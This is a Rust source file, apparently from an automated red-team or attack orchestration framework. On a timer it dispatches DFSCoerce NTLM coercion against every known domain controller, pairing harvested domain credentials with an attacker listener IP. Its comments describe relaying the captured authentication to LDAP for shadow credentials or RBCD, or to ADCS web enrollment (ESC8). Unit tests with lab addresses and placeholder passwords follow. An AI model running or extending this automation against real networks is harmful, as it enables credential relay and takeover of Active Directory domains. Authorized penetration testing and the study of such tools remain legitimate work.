//! auto_dfs_coercion -- trigger DFSCoerce (MS-DFSNM) NTLM coercion against DCs.
//!
//! DFSCoerce abuses the MS-DFSNM protocol (Distributed File System Namespace
//! Management) to force a DC to authenticate to an attacker listener. Unlike
//! PetitPotam, DFSCoerce requires valid domain credentials but works on
//! systems where PetitPotam's unauthenticated path has been patched.
//!
//! The captured NTLM auth can be relayed to LDAP (shadow creds, RBCD) or
//! ADCS web enrollment (ESC8).

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dispatches DFSCoerce against each DC that hasn't been DFS-coerced.
/// Interval: 45s.
pub async fn auto_dfs_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("dfs_coercion") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<DfsWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            for (domain, dc_ip) in &state.domain_controllers {
                if dc_ip.as_str() == listener {
                    continue;
                }

                let dedup_key = format!("dfs_coerce:{dc_ip}");
                if state.is_processed(DEDUP_DFS_COERCION, &dedup_key) {
                    continue;
                }

                let cred = match state
                    .credentials
                    .iter()
                    .find(|c| c.domain.to_lowercase() == domain.to_lowercase())
                    .or_else(|| state.credentials.first())
                {
                    Some(c) => c.clone(),
                    None => continue,
                };

                items.push(DfsWork {
                    dedup_key,
                    domain: domain.clone(),
                    dc_ip: dc_ip.clone(),
                    listener: listener.clone(),
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "dfs_coercion",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "listener_ip": item.listener,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("dfs_coercion");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        dc = %item.dc_ip,
                        "DFSCoerce (MS-DFSNM) coercion dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_DFS_COERCION, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_DFS_COERCION, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(dc = %item.dc_ip, "DFSCoerce task deferred");
                }
                Err(e) => {
                    warn!(err = %e, dc = %item.dc_ip, "Failed to dispatch DFSCoerce");
                }
            }
        }
    }
}

struct DfsWork {
    dedup_key: String,
    domain: String,
    dc_ip: String,
    listener: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("dfs_coerce:{}", "192.168.58.10");
        assert_eq!(key, "dfs_coerce:192.168.58.10");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_DFS_COERCION, "dfs_coercion");
    }

    #[test]
    fn skips_self_listener() {
        let dc_ip = "192.168.58.50";
        let listener = "192.168.58.50";
        assert_eq!(dc_ip, listener, "DC IP matching listener should be skipped");

        let dc_ip2 = "192.168.58.10";
        assert_ne!(dc_ip2, listener, "Different IP should not be skipped");
    }

    #[test]
    fn payload_structure_validation() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let payload = serde_json::json!({
            "technique": "dfs_coercion",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local",
            "listener_ip": "192.168.58.50",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });

        assert_eq!(payload["technique"], "dfs_coercion");
        assert_eq!(payload["target_ip"], "192.168.58.10");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(payload["listener_ip"], "192.168.58.50");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn work_struct_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "testuser".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let work = DfsWork {
            dedup_key: "dfs_coerce:192.168.58.10".into(),
            domain: "contoso.local".into(),
            dc_ip: "192.168.58.10".into(),
            listener: "192.168.58.50".into(),
            credential: cred,
        };

        assert_eq!(work.dedup_key, "dfs_coerce:192.168.58.10");
        assert_eq!(work.domain, "contoso.local");
        assert_eq!(work.dc_ip, "192.168.58.10");
        assert_eq!(work.listener, "192.168.58.50");
        assert_eq!(work.credential.username, "testuser");
    }

    #[test]
    fn self_targeting_prevention() {
        let listener = "192.168.58.50";
        let dc_ips = ["192.168.58.10", "192.168.58.50", "192.168.58.20"];

        let non_self: Vec<&&str> = dc_ips.iter().filter(|ip| **ip != listener).collect();

        assert_eq!(non_self.len(), 2);
        assert!(!non_self.contains(&&"192.168.58.50"));
        assert!(non_self.contains(&&"192.168.58.10"));
        assert!(non_self.contains(&&"192.168.58.20"));
    }

    #[test]
    fn domain_extraction_for_credential_match() {
        let domain = "contoso.local";
        let cred_domain = "CONTOSO.LOCAL";
        assert_eq!(
            cred_domain.to_lowercase(),
            domain.to_lowercase(),
            "Domain matching should be case-insensitive"
        );

        let domain2 = "fabrikam.local";
        assert_ne!(
            cred_domain.to_lowercase(),
            domain2.to_lowercase(),
            "Different domains should not match"
        );
    }
}
